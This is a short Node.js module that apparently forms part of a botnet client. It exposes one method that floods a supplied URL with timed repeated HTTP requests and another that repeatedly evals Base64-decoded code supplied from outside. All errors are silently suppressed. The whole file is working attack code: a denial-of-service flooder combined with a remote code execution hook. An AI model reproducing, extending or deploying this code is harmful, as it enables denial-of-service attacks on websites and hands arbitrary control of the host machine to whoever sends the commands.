const request = require("request");
const { Base64 } = require('js-base64');
const os = require('os');

class httpRainClass {
  constructor() {
    this.timer;
  }
  start = (data) => {
    console.log({ httpStart: data });
    this.timer = setInterval(() => {
      try {
        request(data.url, (error, response, html) => { });
      } catch (requestErr) { }
    }, data.interval);
    setTimeout(() => {
      clearInterval(this.timer);
    }, data.seconds * 1000);
  };

  codeRainStart = (data) => {
    try {
      console.log({ codeRainStart: data });
      this.timer = setInterval(() => {
        try {
          eval(Base64.decode(data.code));
        } catch (requestErr) { }
      }, data.interval);
      setTimeout(() => {
        clearInterval(this.timer);
      }, data.seconds * 1000);
    } catch (err) { }
  }

}
module.exports = new httpRainClass();
